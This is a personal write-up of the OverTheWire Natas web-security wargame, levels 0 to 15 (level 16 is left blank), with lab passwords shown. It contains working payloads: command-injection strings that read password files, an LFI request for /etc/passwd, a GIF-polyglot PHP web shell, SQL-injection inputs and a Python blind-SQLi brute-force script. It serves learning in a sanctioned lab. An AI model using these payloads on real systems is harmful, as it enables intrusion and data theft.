---
description: write-up my approach and solutions for the Natas wargames on overthewire.org
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Natas - web security

## Intro

## Useful Resources

* [CyberChef](https://gchq.github.io/CyberChef/)
* [SQL Injections](../w33bsec_c00kb00k/exploitation/sql-injections.md)

## Natas Level 0

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

Inspect page -> password inside a comment in the body

## Natas Level 1

```
Username:         natas1
Next Password:    0.....q
URL:              http://natas1.natas.labs.overthewire.org
```

\
Page says right clicking has been blocked - However the block is done in correctly and does not apply to the whole page. Even if it was CTRL + SHIFT + I (Firefox) would bypass this block\
Once the inspector is open the password can once again be found inside a comment

## Natas Level 2

```
Username:         natas2
Next Password:    3.....H
URL:              http://natas2.natas.labs.overthewire.org
```

See requests made for /files/pixel.png accessing /files folder reveals a user.txt with the password for natas3

## Natas Level 3

```
Username:         natas3
Next Password:    Q.....Q
URL:              http://natas3.natas.labs.overthewire.org
```

Inspecting reveals a comment inside the html "No more information leaks!! Not even Google will find it this time..."\
Made me check for /robots.txt:

```
User-agent: *
Disallow: /s3cr3t/
```

Going to /s3cr3t/ revealed another users.txt inside it with the next password

## Natas Level 4

```
Username:         natas4
Next Password:    0.....K
URL:              http://natas4.natas.labs.overthewire.org
```

Visiting the site it practically tells you what to do:

> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org

So my solution was:

```
curl http://natas4.natas.labs.overthewire.org/index.php -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ --referer http://natas5.natas.labs.overthewire.org/
```

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

> Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

## Natas Level 5

```
Username:         natas5
Next Password:    0.....d
URL:              http://natas5.natas.labs.overthewire.org
```

Upon accessing the site an error is shown:

> Access disallowed. You are not logged in

Checking cookies a cookie named **loggedin** with the value set to **0** is discovered.\
Changing this value to **1** and refreshing the page revealed the password.

> Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

## Natas Level 6

```
Username:         natas6
Next Password:    b.....S
URL:              http://natas6.natas.labs.overthewire.org
```

The page now asks for a second password using the following script

```javascript
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

This leads us to the following directory and file:\
[http://natas6.natas.labs.overthewire.org/includes/secret.inc](http://natas6.natas.labs.overthewire.org/includes/secret.inc)\
Which exposed the secret for the 2nd login

> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Natas Level 7

```
Username:         natas7
Next Password:    x.....Q
URL:              http://natas7.natas.labs.overthewire.org
```

Therw are 2 buttons Home and About which open links like this [http://natas7.natas.labs.overthewire.org/index.php?page=about](http://natas7.natas.labs.overthewire.org/index.php?page=about)

Accessing a random page like [http://natas7.natas.labs.overthewire.org/index.php?page=password](http://natas7.natas.labs.overthewire.org/index.php?page=password)

The site presents the following output

> Warning: include(password): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
>
> Warning: include(): Failed opening 'password' for inclusion (include\_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21

This output looks suspiciously vulnerable to [LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)

Testing for [http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd) proves this suspicion

> root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/ :x\
> ...

Viewing the html file of the page revealed a hint for the correct file to access:\
[http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas\_webpass/natas8](http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8)

## Natas Level 8

```
Username:         natas8
Next Password:    Z.....t
URL:              http://natas8.natas.labs.overthewire.org
```

We are immediately shown a prompt to enter some sort of secret and a button to view the source code used for this field

```javascript
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Putting the string into [CyberChef](https://gchq.github.io/CyberChef/) with the following recipe revealed the decoded string:

Input: 3d3d516343746d4d6d6c315669563362\
From Hex -> Reverse -> From Base64\
Output: oubWYf2kBq

Entering this secret into the field revealed the password for the level 9

## Natas Level 9

```
Username:         natas9
Next Password:    t.....u
URL:              http://natas9.natas.labs.overthewire.org
```

Another small application. This one directly inserts the user provided input into php without any sanitisation.

```javascript
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

We can abuse this by test; pwd and get the following output

```
/var/www/natas/natas9
```

Using the hint from level 7 I used the following command to get the next password

```
test; cat /etc/natas_webpass/natas10
```

## Natas Level 10 <a href="#natas-level-10" id="natas-level-10"></a>

```
Username:         natas10
Next Password:    UJ.....k
URL:              http://natas10.natas.labs.overthewire.org
```

Same deal as before, except now certain characters are considered illegal.\
This match is far to limited and overall not very effective a simple dot can bypass it completely.

```javascript
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The following input revealed the next password

```
. /etc/natas_webpass/natas11
```

## Natas Level 11 <a href="#natas-level-11" id="natas-level-11"></a>

```
Username:         natas11
Next Password:    y.....B
URL:              http://natas11.natas.labs.overthewire.org
```

Now we are show a hint that **Cookies are protected with XOR encryption** and a field to change the background colour and again a link to view the sourcecode.

The important part in the sourcecode is how the cookie gets set and and how the data is constructed:

```javascript
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

From this we know the plaintext value and can reverse the encoding procedure:\
\
Input: data cookie\
URL Decode -> From Base64 -> XOR {"showpassword":"no","bgcolor":"#ffffff"} (UTF-8)\
Output: repeating XOR key\
\
Having the XOR key we can forge a new cookie with different data\
\
Input: {"showpassword":"yes","bgcolor":"#ffffff"}\
XOR key (UTF-8) -> To Base64 -> URL Encode (all special chars)\
Output: New cookie with showpassword set to yes\
\
After swapping the cookie and reloading the page the password for the next level was shown.

## Natas Level 12 <a href="#natas-level-12" id="natas-level-12"></a>

```
Username:         natas12
Next Password:    t.....C
URL:              http://natas12.natas.labs.overthewire.org
```

Now we see the option to upload 1kB file, supposedly a JPEG, which would be an extremely tiny picture given the file size limit.\
Checking the source code some sever flaws stick out:\
\- the folder and more importantly file extension come from a hidden user controlled field on the html\
\- the file is saved exactly as written in these fields\
\- only actual limitation is the file size\
\
**This likely will be vulnerable to Unrestricted File Upload (potentially leading to Remote Code Execution)**\
\
I tested this by selecting a text file with the following content to be uplaoded and changing the hidden fields value to end in .php instead of .jpg.

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

After uploading the file a link is presented, clicking it displays the password for the next level.\
Confirming that the server indeed ran the uploaded PHP.

## Natas Level 13 <a href="#natas-level-13" id="natas-level-13"></a>

```
Username:         natas13
Next Password:    z.....Q
URL:              http://natas13.natas.labs.overthewire.org
```

This level looks very similar to the previous one, except now they upgraded!

> For security reasons, we now only accept image files!

The source code looks pretty similar and they are using exif\_imagetype to check the uploaded file.\
\
exif\_imagetype only checks first few bytes (magic bytes) of the file to confirm it matches known image formats. It does no further validation of the data.\
\
So this type the approach will be practically the same, except turning the PHP into a "polyglot" by setting the magic bytes to match GIF, as this was the easiest to do since these are all within the ASCII range and just need to be typed before the php. I also changed the php, since the previous file was too big with the magic header added.

```php
GIF87a<?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>
```

Accessing the link after uploading the file presents us the following error:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

We need to add a value to the cmd parameter. Appending the URL with _?cmd=cat%20/etc/natas\_webpass/natas14_ showed the password for the next level.

## Natas Level 14 <a href="#natas-level-14" id="natas-level-14"></a>

```
Username:         natas14
Next Password:    S.....x
URL:              http://natas14.natas.labs.overthewire.org
```

Knowing how these levels work this screamed [SQL injection](../w33bsec_c00kb00k/exploitation/sql-injections.md). \
Checking the sourcecode just confirmed this. There are various solutions. My first one was:

**username:"--**\
**password:"OR 1=1**

## Natas Level 15 <a href="#natas-level-15" id="natas-level-15"></a>

```
Username:         natas15
Next Password:    hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
URL:              http://natas15.natas.labs.overthewire.org
```

In this level there is no password field. Just a button to check if a user exists and more source code to examine.\
Viewing this source code we can see that it now only checks if a user exists which is either TRUE or FALSE.\
Time to start testing for Boolean-based Blind SQLi. Checking if natas16 returns true, as expected.

```sql
natas16" AND password LIKE BINARY "a%
```

This queries the database if the user natas16 exists and the password starts with 'a'. ([MySQL BINARY Function](https://www.w3schools.com/mysql/func_mysql_binary.asp)) So all we have to do is automate the guessing process.&#x20;

```python
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

while True:
    found = False
    for c in charset:
        payload = f'natas16" AND password LIKE BINARY "{password}{c}%'
        r = requests.post(url, data={"username": payload}, auth=auth)
        if "This user exists" in r.text:
            password += c
            print(f"[+]progress: {password}")
            found = True
            break

    if not found:
        print(f"[✓]DONE: {password}")
        break
```

<figure><img src="../.gitbook/assets/image (3).png" alt="" width="265"><figcaption></figcaption></figure>

## Level 16

```
Username:         natas16
Next Password:    
URL:              http://natas16.natas.labs.overthewire.org
```

